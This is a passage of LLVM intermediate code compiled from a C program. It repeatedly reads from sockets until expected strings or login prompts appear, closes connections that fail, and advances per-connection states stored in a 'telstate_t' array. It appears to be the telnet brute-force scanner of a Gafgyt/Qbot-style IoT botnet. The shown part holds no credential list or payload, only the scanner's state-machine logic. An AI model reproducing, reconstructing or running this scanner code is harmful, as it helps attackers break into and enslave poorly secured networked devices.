  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 0
  %1264 = load i32, i32* %1263, align 16
  %1265 = call i32 @sclose(i32 noundef %1264)
  %1266 = load i32, i32* %2, align 4
  %1267 = sext i32 %1266 to i64
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1267
  %1269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1268, i32 0, i32 2
  store i8 0, i8* %1269, align 8
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 3
  store i8 0, i8* %1273, align 1
  br label %1950

1274:                                             ; preds = %1238
  %1275 = load i32, i32* %2, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 8
  %1279 = load i8*, i8** %1278, align 8
  %1280 = call i32 @matchPrompt(i8* noundef %1279)
  %1281 = icmp ne i32 %1280, 0
  br i1 %1281, label %1302, label %1282

1282:                                             ; preds = %1274
  %1283 = load i32, i32* %2, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 8
  %1287 = load i8*, i8** %1286, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1287, i8 0, i64 1024, i1 false)
  %1288 = load i32, i32* %2, align 4
  %1289 = sext i32 %1288 to i64
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1289
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1290, i32 0, i32 0
  %1292 = load i32, i32* %1291, align 16
  %1293 = call i32 @sclose(i32 noundef %1292)
  %1294 = load i32, i32* %2, align 4
  %1295 = sext i32 %1294 to i64
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 2
  store i8 0, i8* %1297, align 8
  %1298 = load i32, i32* %2, align 4
  %1299 = sext i32 %1298 to i64
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1299
  %1301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1300, i32 0, i32 3
  store i8 1, i8* %1301, align 1
  br label %1950

1302:                                             ; preds = %1274
  %1303 = load i32, i32* %2, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1304
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1305, i32 0, i32 2
  store i8 7, i8* %1306, align 8
  br label %1307

1307:                                             ; preds = %1302
  %1308 = load i32, i32* %2, align 4
  %1309 = sext i32 %1308 to i64
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1309
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1310, i32 0, i32 8
  %1312 = load i8*, i8** %1311, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1312, i8 0, i64 1024, i1 false)
  br label %1950

1313:                                             ; preds = %1219
  %1314 = load i32, i32* %2, align 4
  %1315 = sext i32 %1314 to i64
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1315
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1316, i32 0, i32 0
  %1318 = load i32, i32* %1317, align 16
  %1319 = load i32, i32* %2, align 4
  %1320 = sext i32 %1319 to i64
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1320
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1321, i32 0, i32 8
  %1323 = load i8*, i8** %1322, align 8
  %1324 = load i32, i32* %2, align 4
  %1325 = sext i32 %1324 to i64
  %1326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1325
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1326, i32 0, i32 7
  %1328 = load i16, i16* %1327, align 16
  %1329 = zext i16 %1328 to i32
  %1330 = call i32 @readUntil(i32 noundef %1318, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1323, i32 noundef 1024, i32 noundef %1329)
  %1331 = icmp ne i32 %1330, 0
  br i1 %1331, label %1332, label %1407

1332:                                             ; preds = %1313
  %1333 = load i32, i32* %2, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1334
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1335, i32 0, i32 6
  store i32 0, i32* %1336, align 4
  %1337 = load i32, i32* %2, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1338
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1339, i32 0, i32 7
  store i16 0, i16* %1340, align 16
  %1341 = load i32, i32* %2, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 8
  %1345 = load i8*, i8** %1344, align 8
  %1346 = call i8* @strstr(i8* noundef %1345, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #11
  %1347 = icmp ne i8* %1346, null
  br i1 %1347, label %1348, label %1368

1348:                                             ; preds = %1332
  %1349 = load i32, i32* %2, align 4
  %1350 = sext i32 %1349 to i64
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1350
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1351, i32 0, i32 8
  %1353 = load i8*, i8** %1352, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1353, i8 0, i64 1024, i1 false)
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 0
  %1358 = load i32, i32* %1357, align 16
  %1359 = call i32 @sclose(i32 noundef %1358)
  %1360 = load i32, i32* %2, align 4
  %1361 = sext i32 %1360 to i64
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1361
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1362, i32 0, i32 2
  store i8 0, i8* %1363, align 8
  %1364 = load i32, i32* %2, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1366, i32 0, i32 3
  store i8 0, i8* %1367, align 1
  br label %1950

1368:                                             ; preds = %1332
  %1369 = load i32, i32* %2, align 4
  %1370 = sext i32 %1369 to i64
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1370
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1371, i32 0, i32 8
  %1373 = load i8*, i8** %1372, align 8
  %1374 = call i32 @matchPrompt(i8* noundef %1373)
  %1375 = icmp ne i32 %1374, 0
  br i1 %1375, label %1396, label %1376

1376:                                             ; preds = %1368
  %1377 = load i32, i32* %2, align 4
  %1378 = sext i32 %1377 to i64
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1378
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1379, i32 0, i32 8
  %1381 = load i8*, i8** %1380, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1381, i8 0, i64 1024, i1 false)
  %1382 = load i32, i32* %2, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 0
  %1386 = load i32, i32* %1385, align 16
  %1387 = call i32 @sclose(i32 noundef %1386)
  %1388 = load i32, i32* %2, align 4
  %1389 = sext i32 %1388 to i64
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1389
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1390, i32 0, i32 2
  store i8 0, i8* %1391, align 8
  %1392 = load i32, i32* %2, align 4
  %1393 = sext i32 %1392 to i64
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1393
  %1395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1394, i32 0, i32 3
  store i8 1, i8* %1395, align 1
  br label %1950

1396:                                             ; preds = %1368
  %1397 = load i32, i32* %2, align 4
  %1398 = sext i32 %1397 to i64
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1398
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1399, i32 0, i32 2
  store i8 7, i8* %1400, align 8
  br label %1401

1401:                                             ; preds = %1396
  %1402 = load i32, i32* %2, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1403
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1404, i32 0, i32 8
  %1406 = load i8*, i8** %1405, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1406, i8 0, i64 1024, i1 false)
  br label %1950

1407:                                             ; preds = %1313
  %1408 = load i32, i32* %2, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1409
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1410, i32 0, i32 0
  %1412 = load i32, i32* %1411, align 16
  %1413 = load i32, i32* %2, align 4
  %1414 = sext i32 %1413 to i64
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1414
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1415, i32 0, i32 8
  %1417 = load i8*, i8** %1416, align 8
  %1418 = load i32, i32* %2, align 4
  %1419 = sext i32 %1418 to i64
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1419
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1420, i32 0, i32 7
  %1422 = load i16, i16* %1421, align 16
  %1423 = zext i16 %1422 to i32
  %1424 = call i32 @readUntil(i32 noundef %1412, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1417, i32 noundef 1024, i32 noundef %1423)
  %1425 = icmp ne i32 %1424, 0
  br i1 %1425, label %1426, label %1501

1426:                                             ; preds = %1407
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 6
  store i32 0, i32* %1430, align 4
  %1431 = load i32, i32* %2, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 7
  store i16 0, i16* %1434, align 16
  %1435 = load i32, i32* %2, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1436
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1437, i32 0, i32 8
  %1439 = load i8*, i8** %1438, align 8
  %1440 = call i8* @strstr(i8* noundef %1439, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #11
  %1441 = icmp ne i8* %1440, null
  br i1 %1441, label %1442, label %1462

1442:                                             ; preds = %1426
  %1443 = load i32, i32* %2, align 4
  %1444 = sext i32 %1443 to i64
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1444
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1445, i32 0, i32 8
  %1447 = load i8*, i8** %1446, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1447, i8 0, i64 1024, i1 false)
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 0
  %1452 = load i32, i32* %1451, align 16
  %1453 = call i32 @sclose(i32 noundef %1452)
  %1454 = load i32, i32* %2, align 4
  %1455 = sext i32 %1454 to i64
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1455
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1456, i32 0, i32 2
  store i8 0, i8* %1457, align 8
  %1458 = load i32, i32* %2, align 4
  %1459 = sext i32 %1458 to i64
  %1460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1459
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1460, i32 0, i32 3
  store i8 0, i8* %1461, align 1
  br label %1950

1462:                                             ; preds = %1426
  %1463 = load i32, i32* %2, align 4
  %1464 = sext i32 %1463 to i64
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1464
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1465, i32 0, i32 8
  %1467 = load i8*, i8** %1466, align 8
  %1468 = call i32 @matchPrompt(i8* noundef %1467)
  %1469 = icmp ne i32 %1468, 0
  br i1 %1469, label %1490, label %1470

1470:                                             ; preds = %1462
  %1471 = load i32, i32* %2, align 4
  %1472 = sext i32 %1471 to i64
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1472
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1473, i32 0, i32 8
  %1475 = load i8*, i8** %1474, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1475, i8 0, i64 1024, i1 false)
  %1476 = load i32, i32* %2, align 4
  %1477 = sext i32 %1476 to i64
  %1478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1477
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1478, i32 0, i32 0
  %1480 = load i32, i32* %1479, align 16
  %1481 = call i32 @sclose(i32 noundef %1480)
  %1482 = load i32, i32* %2, align 4
  %1483 = sext i32 %1482 to i64
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1483
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1484, i32 0, i32 2
  store i8 0, i8* %1485, align 8
  %1486 = load i32, i32* %2, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 3
  store i8 1, i8* %1489, align 1
  br label %1950

1490:                                             ; preds = %1462
  %1491 = load i32, i32* %2, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 2
  store i8 7, i8* %1494, align 8
  br label %1495

1495:                                             ; preds = %1490
  %1496 = load i32, i32* %2, align 4
  %1497 = sext i32 %1496 to i64
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1497
  %1499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1498, i32 0, i32 8
  %1500 = load i8*, i8** %1499, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1500, i8 0, i64 1024, i1 false)
  br label %1950

1501:                                             ; preds = %1407
  %1502 = load i32, i32* %2, align 4
  %1503 = sext i32 %1502 to i64
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1503
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1504, i32 0, i32 0
  %1506 = load i32, i32* %1505, align 16
  %1507 = load i32, i32* %2, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1508
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1509, i32 0, i32 8
  %1511 = load i8*, i8** %1510, align 8
  %1512 = load i32, i32* %2, align 4
  %1513 = sext i32 %1512 to i64
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1513
  %1515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1514, i32 0, i32 7
  %1516 = load i16, i16* %1515, align 16
  %1517 = zext i16 %1516 to i32
  %1518 = call i32 @readUntil(i32 noundef %1506, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1511, i32 noundef 1024, i32 noundef %1517)
  %1519 = icmp ne i32 %1518, 0
  br i1 %1519, label %1520, label %1595

1520:                                             ; preds = %1501
  %1521 = load i32, i32* %2, align 4
  %1522 = sext i32 %1521 to i64
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1522
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1523, i32 0, i32 6
  store i32 0, i32* %1524, align 4
  %1525 = load i32, i32* %2, align 4
  %1526 = sext i32 %1525 to i64
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1526
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1527, i32 0, i32 7
  store i16 0, i16* %1528, align 16
  %1529 = load i32, i32* %2, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1531, i32 0, i32 8
  %1533 = load i8*, i8** %1532, align 8
  %1534 = call i8* @strstr(i8* noundef %1533, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #11
  %1535 = icmp ne i8* %1534, null
  br i1 %1535, label %1536, label %1556

1536:                                             ; preds = %1520
  %1537 = load i32, i32* %2, align 4
  %1538 = sext i32 %1537 to i64
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1538
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1539, i32 0, i32 8
  %1541 = load i8*, i8** %1540, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1541, i8 0, i64 1024, i1 false)
  %1542 = load i32, i32* %2, align 4
  %1543 = sext i32 %1542 to i64
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1543
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1544, i32 0, i32 0
  %1546 = load i32, i32* %1545, align 16
  %1547 = call i32 @sclose(i32 noundef %1546)
  %1548 = load i32, i32* %2, align 4
  %1549 = sext i32 %1548 to i64
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1549
  %1551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1550, i32 0, i32 2
  store i8 0, i8* %1551, align 8
  %1552 = load i32, i32* %2, align 4
  %1553 = sext i32 %1552 to i64
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1553
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1554, i32 0, i32 3
  store i8 0, i8* %1555, align 1
  br label %1950

1556:                                             ; preds = %1520
  %1557 = load i32, i32* %2, align 4
  %1558 = sext i32 %1557 to i64
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1558
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1559, i32 0, i32 8
  %1561 = load i8*, i8** %1560, align 8
  %1562 = call i32 @matchPrompt(i8* noundef %1561)
  %1563 = icmp ne i32 %1562, 0
  br i1 %1563, label %1584, label %1564

1564:                                             ; preds = %1556
  %1565 = load i32, i32* %2, align 4
  %1566 = sext i32 %1565 to i64
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1566
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1567, i32 0, i32 8
  %1569 = load i8*, i8** %1568, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1569, i8 0, i64 1024, i1 false)
  %1570 = load i32, i32* %2, align 4
  %1571 = sext i32 %1570 to i64
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1571
  %1573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1572, i32 0, i32 0
  %1574 = load i32, i32* %1573, align 16
  %1575 = call i32 @sclose(i32 noundef %1574)
  %1576 = load i32, i32* %2, align 4
  %1577 = sext i32 %1576 to i64
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1577
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1578, i32 0, i32 2
  store i8 0, i8* %1579, align 8
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 3
  store i8 1, i8* %1583, align 1
  br label %1950

1584:                                             ; preds = %1556
  %1585 = load i32, i32* %2, align 4
  %1586 = sext i32 %1585 to i64
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1586
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1587, i32 0, i32 2
  store i8 7, i8* %1588, align 8
  br label %1589

1589:                                             ; preds = %1584
  %1590 = load i32, i32* %2, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1591
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1592, i32 0, i32 8
  %1594 = load i8*, i8** %1593, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1594, i8 0, i64 1024, i1 false)
  br label %1950

1595:                                             ; preds = %1501
  %1596 = load i32, i32* %2, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1597
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1598, i32 0, i32 0
  %1600 = load i32, i32* %1599, align 16
  %1601 = load i32, i32* %2, align 4
  %1602 = sext i32 %1601 to i64
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1602
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1603, i32 0, i32 8
  %1605 = load i8*, i8** %1604, align 8
  %1606 = load i32, i32* %2, align 4
  %1607 = sext i32 %1606 to i64
  %1608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1607
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1608, i32 0, i32 7
  %1610 = load i16, i16* %1609, align 16
  %1611 = zext i16 %1610 to i32
  %1612 = call i32 @readUntil(i32 noundef %1600, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1605, i32 noundef 1024, i32 noundef %1611)
  %1613 = icmp ne i32 %1612, 0
  br i1 %1613, label %1614, label %1689

1614:                                             ; preds = %1595
  %1615 = load i32, i32* %2, align 4
  %1616 = sext i32 %1615 to i64
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1616
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1617, i32 0, i32 6
  store i32 0, i32* %1618, align 4
  %1619 = load i32, i32* %2, align 4
  %1620 = sext i32 %1619 to i64
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1620
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1621, i32 0, i32 7
  store i16 0, i16* %1622, align 16
  %1623 = load i32, i32* %2, align 4
  %1624 = sext i32 %1623 to i64
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1624
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1625, i32 0, i32 8
  %1627 = load i8*, i8** %1626, align 8
  %1628 = call i8* @strstr(i8* noundef %1627, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #11
  %1629 = icmp ne i8* %1628, null
  br i1 %1629, label %1630, label %1650

1630:                                             ; preds = %1614
  %1631 = load i32, i32* %2, align 4
  %1632 = sext i32 %1631 to i64
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1632
  %1634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1633, i32 0, i32 8
  %1635 = load i8*, i8** %1634, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1635, i8 0, i64 1024, i1 false)
  %1636 = load i32, i32* %2, align 4
  %1637 = sext i32 %1636 to i64
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1637
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1638, i32 0, i32 0
  %1640 = load i32, i32* %1639, align 16
  %1641 = call i32 @sclose(i32 noundef %1640)
  %1642 = load i32, i32* %2, align 4
  %1643 = sext i32 %1642 to i64
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1643
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1644, i32 0, i32 2
  store i8 0, i8* %1645, align 8
  %1646 = load i32, i32* %2, align 4
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1647
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1648, i32 0, i32 3
  store i8 0, i8* %1649, align 1
  br label %1950

1650:                                             ; preds = %1614
  %1651 = load i32, i32* %2, align 4
  %1652 = sext i32 %1651 to i64
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1652
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1653, i32 0, i32 8
  %1655 = load i8*, i8** %1654, align 8
  %1656 = call i32 @matchPrompt(i8* noundef %1655)
  %1657 = icmp ne i32 %1656, 0
  br i1 %1657, label %1678, label %1658

1658:                                             ; preds = %1650
  %1659 = load i32, i32* %2, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1660
  %1662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1661, i32 0, i32 8
  %1663 = load i8*, i8** %1662, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1663, i8 0, i64 1024, i1 false)
  %1664 = load i32, i32* %2, align 4
  %1665 = sext i32 %1664 to i64
  %1666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1665
  %1667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1666, i32 0, i32 0
  %1668 = load i32, i32* %1667, align 16
  %1669 = call i32 @sclose(i32 noundef %1668)
  %1670 = load i32, i32* %2, align 4
  %1671 = sext i32 %1670 to i64
  %1672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1671
  %1673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1672, i32 0, i32 2
  store i8 0, i8* %1673, align 8
  %1674 = load i32, i32* %2, align 4
  %1675 = sext i32 %1674 to i64
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1675
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1676, i32 0, i32 3
  store i8 1, i8* %1677, align 1
  br label %1950

1678:                                             ; preds = %1650
  %1679 = load i32, i32* %2, align 4
  %1680 = sext i32 %1679 to i64
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1680
  %1682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1681, i32 0, i32 2
  store i8 7, i8* %1682, align 8
  br label %1683

1683:                                             ; preds = %1678
  %1684 = load i32, i32* %2, align 4
  %1685 = sext i32 %1684 to i64
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1685
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1686, i32 0, i32 8
  %1688 = load i8*, i8** %1687, align 8
